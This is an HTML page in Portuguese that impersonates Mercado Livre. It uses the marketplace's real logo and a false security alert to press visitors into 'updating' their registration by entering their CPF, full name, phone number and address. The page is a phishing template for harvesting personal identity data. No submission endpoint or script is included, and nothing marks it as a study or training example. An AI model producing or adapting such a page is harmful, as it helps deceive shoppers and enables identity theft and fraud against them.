<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Atualização de Cadastro - Mercado Livre</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
        }
        .ml-logo {
            width: 200px;
            margin-bottom: 15px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .alert {
            color: #ff4444;
            font-size: 0.9em;
            margin: 10px 0;
        }
        .btn {
            background: #ffe600;
            color: #2d3277;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png" 
                 alt="Mercado Livre" 
                 class="ml-logo">
            <h2>Atualização de Cadastro</h2>
            <p class="alert">⚠️ Por segurança, atualize seus dados para continuar comprando</p>
        </div>

        <form>
            <div class="form-group">
                <label>CPF:</label>
                <input type="text" placeholder="Digite seu CPF" required>
            </div>

            <div class="form-group">
                <label>Nome Completo:</label>
                <input type="text" placeholder="Seu nome completo" required>
            </div>

            <div class="form-group">
                <label>Número de Telefone:</label>
                <input type="tel" placeholder="(DDD) 9XXXX-XXXX" required>
            </div>

            <div class="form-group">
                <label>Endereço Completo:</label>
                <input type="text" placeholder="Rua, Número, Bairro, Cidade" required>
            </div>

            <button type="submit" class="btn">Atualizar Dados</button>
        </form>

  

  
</body>
</html>
